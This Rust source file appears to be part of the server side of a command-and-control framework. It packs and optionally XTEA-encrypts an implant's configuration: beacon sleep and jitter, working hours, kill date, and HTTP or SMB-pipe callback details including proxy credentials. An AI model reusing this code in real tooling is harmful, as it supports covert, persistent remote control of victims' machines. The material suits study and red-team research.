use std::str::FromStr;
use crate::return_error;
use crate::server::cipher::{crypt_create_key, crypt_xtea};
use crate::server::stream::Stream;
use crate::server::types::{Hexane, NetworkOptions, TRANSPORT_HTTP, TRANSPORT_PIPE};

impl Hexane {
    pub fn generate_config_bytes(&mut self) -> crate::server::error::Result<()> {
        self.crypt_key = crypt_create_key(16);

        let mut patch = self.create_binary_patch()?;
        if self.main.encrypt {
            let patch_cpy = patch.clone();
            patch = crypt_xtea(&patch_cpy, &self.crypt_key, true)?;
        }

        self.config_data = patch;
        Ok(())
    }

    pub fn create_binary_patch(&self) -> crate::server::error::Result<Vec<u8>> {
        let mut stream = Stream::new();

        match self.network_type {
            TRANSPORT_HTTP  => stream.pack_byte(1),
            TRANSPORT_PIPE  => stream.pack_byte(0),
            _               => return return_error!("Invalid transport type"),
        }

        stream.pack_bytes(&self.crypt_key);
        stream.pack_string(&self.main.hostname);

        stream.pack_dword(self.peer_id);
        stream.pack_dword(self.main.sleeptime);
        stream.pack_dword(self.main.jitter);

        if let Some(ref modules) = self.builder.loaded_modules {
            for module in modules {
                stream.pack_string(module);
            }
        }

        let working_hours = if let Some(ref hours) = self.main.working_hours {
            i32::from_str(hours)?
        } else {
            0
        };

        let kill_date = if let Some(ref date) = self.main.killdate {
            i64::from_str(date)?
        } else {
            0
        };

        stream.pack_int32(working_hours);
        stream.pack_dword64(kill_date);

        match &self.network.options {
            NetworkOptions::Http(mut http) => {
                stream.pack_wstring(&http.useragent.unwrap().as_str());
                stream.pack_wstring(&http.address);
                stream.pack_dword(http.port as u32);
                stream.pack_dword(http.endpoints.len() as u32);

                for endpoint in &http.endpoints {
                    stream.pack_wstring(endpoint);
                }

                stream.pack_string(&http.domain.unwrap().as_str());

                if let Some(mut proxy) = &http.proxy {
                    let proxy_url = format!("{}://{}:{}", proxy.proto, proxy.address, proxy.port);
                    stream.pack_dword(1);
                    stream.pack_wstring(&proxy_url);
                    stream.pack_wstring(&proxy.username.unwrap().as_str());
                    stream.pack_wstring(&proxy.password.unwrap().as_str());
                } else {
                    stream.pack_dword(0);
                }
            }
            NetworkOptions::Smb(mut smb) => {
                stream.pack_wstring(&smb.egress_pipe.unwrap().as_str());
            }
        }

        Ok(stream.buffer)
    }
}
